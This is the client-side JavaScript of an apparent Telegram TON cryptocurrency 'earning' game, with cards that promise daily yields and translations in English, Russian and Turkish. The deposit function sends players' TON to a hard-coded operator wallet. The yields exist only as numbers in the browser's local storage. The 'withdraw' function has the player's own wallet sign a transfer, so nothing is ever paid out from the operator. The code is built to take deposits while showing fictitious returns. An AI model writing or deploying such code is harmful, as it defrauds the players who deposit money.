/* jshint -W069 */

// Wallet-Balance und Spieler-Daten
let walletBalance = localStorage.getItem('walletBalance') ? parseFloat(localStorage.getItem('walletBalance')) : 0;
let playerWalletAddress = null;
const yourWalletAddress = "UQCCMn_NAiSHIbKpjxVLWkboRYGw3YlfVxb8FJa0iX2mMIe0";

// Daten für jede Karte
const cardData = JSON.parse(localStorage.getItem('cardData')) || {
    chuchu: { requiredTon: 1, baseTon: 0, dailyApi: 0.048, intervalHours: 2, intervalEarnings: 0, currentBalance: 0, totalCollected: 0, lastCollected: null, active: false },
    kev: { requiredTon: 3, baseTon: 0, dailyApi: 0.09, intervalHours: 3, intervalEarnings: 0, currentBalance: 0, totalCollected: 0, lastCollected: null, active: false },
    damon: { minTon: 10, maxTon: 50, baseTon: 0, dailyApi: 0.015, intervalHours: 4, intervalEarnings: 0, currentBalance: 0, totalCollected: 0, lastCollected: null, active: false }
};

// Spracheinstellungen
const translations = {
    en: {
        title: "TonLin's",
        "nav-home": "Home",
        "nav-earn": "Earn",
        "nav-balance": "Balance",
        "chuchu-desc": "1 TON - 4.8% API/d - every 2h earn",
        "kev-desc": "3 TON - 3% API/d - every 3h earn",
        "damon-desc": "10-50 TON - 1.5% API/d - every 4h",
        collect: "Collect",
        "total-collected": "Total Collected: ",
        "next-collection": "Next collection: ",
        "now-available": "Now available!",
        "coming-soon": "Coming Soon",
        "wallet-balance": "Wallet Balance: ",
        withdraw: "Withdraw",
        deposit: "Deposit",
        "deposit-to-card": "Deposit to Card",
        "connect-wallet": "Connect Wallet",
        "collect-wait": "You can only collect every ",
        "collect-hours": " hours! Wait a bit.",
        "withdraw-none": "Nothing to withdraw!",
        "withdraw-success": "Withdrawal: ",
        "withdraw-confirm": "Are you sure you want to withdraw ",
        "connect-wallet-first": "Please connect a wallet first!",
        inactive: "Inactive",
        "deposit-amount": "Enter amount to deposit (10-50 TON for Damon)",
        "transaction-failed": "Transaction failed. Please try again."
    },
    ru: {
        title: "TonLin's",
        "nav-home": "Главная",
        "nav-earn": "Заработок",
        "nav-balance": "Баланс",
        "chuchu-desc": "1 TON - 4.8% API/д - каждые 2ч",
        "kev-desc": "3 TON - 3% API/д - каждые 3ч",
        "damon-desc": "10-50 TON - 1.5% API/д - каждые 4ч",
        collect: "Собрать",
        "total-collected": "Всего собрано: ",
        "next-collection": "Следующий сбор: ",
        "now-available": "Доступно сейчас!",
        "coming-soon": "Скоро будет",
        "wallet-balance": "Баланс кошелька: ",
        withdraw: "Вывести",
        deposit: "Пополнить",
        "deposit-to-card": "Пополнить карту",
        "connect-wallet": "Подключить кошелек",
        "collect-wait": "Вы можете собирать только каждые ",
        "collect-hours": " часов! Подождите немного.",
        "withdraw-none": "Нечего выводить!",
        "withdraw-success": "Вывод: ",
        "withdraw-confirm": "Вы уверены, что хотите вывести ",
        "connect-wallet-first": "Сначала подключите кошелек!",
        inactive: "Неактивно",
        "deposit-amount": "Введите сумму для пополнения (10-50 TON для Damon)",
        "transaction-failed": "Транзакция не удалась. Попробуйте снова."
    },
    tr: {
        title: "TonLin's",
        "nav-home": "Ana Sayfa",
        "nav-earn": "Kazan",
        "nav-balance": "Bakiye",
        "chuchu-desc": "1 TON - 4.8% API/g - her 2 saatte",
        "kev-desc": "3 TON - 3% API/g - her 3 saatte",
        "damon-desc": "10-50 TON - 1.5% API/g - her 4 saatte",
        collect: "Topla",
        "total-collected": "Toplam Toplanan: ",
        "next-collection": "Sonraki toplama: ",
        "now-available": "Şimdi mevcut!",
        "coming-soon": "Yakında",
        "wallet-balance": "Cüzdan Bakiyesi: ",
        withdraw: "Çek",
        deposit: "Yatır",
        "deposit-to-card": "Karta Yatır",
        "connect-wallet": "Cüzdanı Bağla",
        "collect-wait": "Sadece her ",
        "collect-hours": " saatte bir toplayabilirsiniz! Biraz bekleyin.",
        "withdraw-none": "Çekilecek bir şey yok!",
        "withdraw-success": "Çekim: ",
        "withdraw-confirm": " emin misiniz çekmek istediğinizden ",
        "connect-wallet-first": "Önce cüzdanı bağlayın!",
        inactive: "Pasif",
        "deposit-amount": "Yatırılacak miktarı girin (Damon için 10-50 TON)",
        "transaction-failed": "İşlem başarısız oldu. Lütfen tekrar deneyin."
    }
};

let currentLang = "en";

// TON Connect Initialisierung
let tonConnectUI;
if (typeof TONConnectUI === 'undefined') {
    console.error('TONConnectUI ist nicht geladen. Überprüfe, ob tonconnect-ui.min.js im Ordner ist und korrekt eingebunden ist.');
} else {
    tonConnectUI = new TONConnectUI({
        manifestUrl: 'https://csen8686.github.io/gremlins/tonconnect-manifest.json',
        twaReturnUrl: 'https://t.me/TonLinBot'
    });

    tonConnectUI.onStatusChange(wallet => {
        if (wallet) {
            playerWalletAddress = wallet.account.address;
            console.log('Wallet verbunden:', playerWalletAddress);
            document.getElementById('connectWallet').textContent = 'Wallet Connected';
        } else {
            playerWalletAddress = null;
            console.log('Wallet getrennt');
            document.getElementById('connectWallet').textContent = translations[currentLang]['connect-wallet'];
        }
    });

    document.getElementById('connectWallet').addEventListener('click', () => {
        tonConnectUI.openModal();
    });
}

// Event-Listener für Dropdown
document.getElementById('languageSwitch').addEventListener('change', (event) => {
    switchLanguage(event.target.value);
});

// Funktion zum Einzahlen auf eine Karte
async function depositToCard(cardId) {
    const card = cardData[cardId];
    if (!tonConnectUI || !tonConnectUI.connected) {
        alert(translations[currentLang]['connect-wallet-first']);
        return;
    }

    let amount;
    if (cardId === 'damon') {
        amount = parseFloat(prompt(translations[currentLang]['deposit-amount']));
        if (isNaN(amount) || amount < card.minTon || amount > card.maxTon) {
            alert(`Please enter a valid amount between ${card.minTon} and ${card.maxTon} TON`);
            return;
        }
        if (card.baseTon + amount > card.maxTon) {
            alert(`Total deposit for Damon cannot exceed ${card.maxTon} TON`);
            return;
        }
    } else {
        amount = card.requiredTon;
    }

    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60,
        messages: [{
            address: yourWalletAddress,
            amount: (amount * 1e9).toString()
        }]
    };

    try {
        await tonConnectUI.sendTransaction(transaction);
        card.baseTon += amount;
        card.intervalEarnings = (card.baseTon / 100 * card.dailyApi) / (24 / card.intervalHours);
        card.active = true;
        updateUI(cardId);
        saveState();
        alert(`Deposited ${amount} TON to ${cardId}`);
    } catch (e) {
        console.error('Deposit Error:', e);
        alert(translations[currentLang]['transaction-failed']);
    }
}

// Funktion zum Sammeln der Gewinne
function collectEarnings(cardId) {
    const card = cardData[cardId];
    const now = Date.now();
    const intervalInMs = card.intervalHours * 60 * 60 * 1000;

    if (!card.active) {
        alert('Card is not active. Deposit TON first!');
        return;
    }

    if (!card.lastCollected || (now - card.lastCollected >= intervalInMs)) {
        card.currentBalance += card.intervalEarnings;
        card.totalCollected += card.intervalEarnings;
        card.lastCollected = now;
        walletBalance += card.intervalEarnings;
        updateUI(cardId);
        document.getElementById('walletBalance').innerText = 
            `${translations[currentLang]['wallet-balance']}${walletBalance.toFixed(4)} TON`;
        saveState();
    } else {
        alert(`${translations[currentLang]['collect-wait']}${card.intervalHours}${translations[currentLang]['collect-hours']}`);
    }
}

// Funktion für Withdraw-Formular anzeigen
function showWithdrawForm() {
    document.getElementById('withdrawForm').style.display = 'block';
}

// Funktion für Auszahlung
async function withdraw() {
    const amount = parseFloat(document.getElementById('withdrawAmount').value);
    const address = document.getElementById('withdrawAddress').value.trim();

    if (isNaN(amount) || amount <= 0 || amount > walletBalance) {
        alert('Invalid amount!');
        return;
    }
    if (!address || address.length < 48) {
        alert('Invalid wallet address!');
        return;
    }

    const confirmMsg = `${translations[currentLang]['withdraw-confirm']}${amount.toFixed(4)} TON to ${address}?`;
    if (!confirm(confirmMsg)) return;

    if (!tonConnectUI || !tonConnectUI.connected) {
        alert(translations[currentLang]['connect-wallet-first']);
        return;
    }

    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60,
        messages: [{
            address: address,
            amount: (amount * 1e9).toString()
        }]
    };

    try {
        await tonConnectUI.sendTransaction(transaction);
        walletBalance -= amount;
        for (let cardId in cardData) {
            updateUI(cardId);
        }
        document.getElementById('walletBalance').innerText = 
            `${translations[currentLang]['wallet-balance']}${walletBalance.toFixed(4)} TON`;
        document.getElementById('withdrawForm').style.display = 'none';
        document.getElementById('withdrawAmount').value = '';
        document.getElementById('withdrawAddress').value = '';
        saveState();
        alert(`${translations[currentLang]['withdraw-success']}${amount.toFixed(4)} TON`);
    } catch (e) {
        console.error('Withdraw Error:', e);
        alert(translations[currentLang]['transaction-failed']);
    }
}

// Funktion für allgemeine Einzahlung
function deposit() {
    if (!tonConnectUI || !tonConnectUI.connected) {
        alert(translations[currentLang]['connect-wallet-first']);
        return;
    }
    alert(`Please send TON to: ${yourWalletAddress}`);
}

// Funktion zum Speichern des Spielstands
function saveState() {
    localStorage.setItem('walletBalance', walletBalance);
    localStorage.setItem('cardData', JSON.stringify(cardData));
}

// Funktion zum Aktualisieren der UI
function updateUI(cardId) {
    const card = cardData[cardId];
    document.getElementById(`${cardId}Collected`).innerText = 
        `Collected: ${card.currentBalance.toFixed(4)} TON`;
    document.getElementById(`${cardId}Total`).innerText = 
        `${translations[currentLang]['total-collected']}${card.totalCollected.toFixed(4)} TON`;
    const collectButton = document.querySelector(`#${cardId} button[onclick^="collect"]`);
    collectButton.disabled = !card.active;
    if (card.active) {
        updateTimer(cardId);
    } else {
        document.getElementById(`${cardId}Timer`).innerText = 
            `${translations[currentLang]['next-collection']}${translations[currentLang].inactive}`;
    }
}

// Funktion zum Aktualisieren des Timers
function updateTimer(cardId) {
    const card = cardData[cardId];
    const now = Date.now();
    const intervalInMs = card.intervalHours * 60 * 60 * 1000;

    if (!card.lastCollected) {
        document.getElementById(`${cardId}Timer`).innerText = 
            `${translations[currentLang]['next-collection']}${translations[currentLang]['now-available']}`;
    } else {
        const timeLeft = intervalInMs - (now - card.lastCollected);
        if (timeLeft > 0) {
            const minutesLeft = Math.floor(timeLeft / (1000 * 60));
            const secondsLeft = Math.floor((timeLeft % (1000 * 60)) / 1000);
            document.getElementById(`${cardId}Timer`).innerText = 
                `${translations[currentLang]['next-collection']}${minutesLeft}m ${secondsLeft}s`;
        } else {
            document.getElementById(`${cardId}Timer`).innerText = 
                `${translations[currentLang]['next-collection']}${translations[currentLang]['now-available']}`;
        }
    }
}

// Funktion zum Anzeigen des Bereichs
function showSection(sectionId) {
    document.querySelectorAll('.section').forEach(section => section.classList.remove('active'));
    document.querySelectorAll('nav button').forEach(button => button.classList.remove('active'));
    document.getElementById(`${sectionId}Section`).classList.add('active');
    document.querySelector(`nav button[onclick="showSection('${sectionId}')"]`).classList.add('active');
}

// Funktion zum Wechseln der Sprache
function switchLanguage(lang) {
    console.log('Sprachwechsel zu:', lang);
    currentLang = lang;
    document.querySelectorAll('[data-lang]').forEach(element => {
        const key = element.getAttribute('data-lang');
        console.log('Aktualisiere:', element.id, 'Key:', key, 'Text:', translations[lang][key]);
        if (key === 'total-collected') {
            const cardId = element.id.replace('Total', '');
            element.innerText = `${translations[lang][key]}${cardData[cardId].totalCollected.toFixed(4)} TON`;
        } else if (key === 'wallet-balance') {
            element.innerText = `${translations[lang][key]}${walletBalance.toFixed(4)} TON`;
        } else if (key === 'next-collection') {
            updateTimer(element.id.replace('Timer', ''));
        } else if (translations[lang][key]) {
            element.innerText = translations[lang][key];
        } else {
            console.warn('Keine Übersetzung für', key, 'in', lang);
        }
    });
}

// Timer jede Sekunde aktualisieren
setInterval(() => {
    for (let cardId in cardData) {
        if (cardData[cardId].active) updateTimer(cardId);
    }
}, 1000);

// Initiale UI setzen
updateUI('chuchu');
updateUI('kev');
updateUI('damon');
switchLanguage('en');